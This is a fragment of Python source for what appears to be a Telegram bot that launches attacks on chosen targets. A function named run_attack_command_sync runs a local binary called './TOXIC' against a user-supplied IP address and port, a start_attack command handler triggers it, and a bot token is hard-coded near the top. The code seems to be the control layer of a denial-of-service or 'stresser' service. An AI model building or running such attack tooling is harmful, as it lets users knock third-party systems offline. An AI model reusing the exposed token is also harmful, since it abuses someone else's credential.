...
# Bot configuration
TOKEN = '7923485436:AAFAA94u46A60QES8B5KV_x1b-te3_1OmsY'
...
def run_attack_command_sync(user_id, target_ip, target_port, action):
    try:
        if action == 1:
            process = subprocess.Popen(["./TOXIC", target_ip, str(target_port), "1", "70"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
...
def start_attack(message):
    ...
    if attack_details:
        ...
        bot.send_message(message.chat.id, "⚠️ *No target specified. Please use /TOXIC to set it up.*", parse_mode='Markdown')
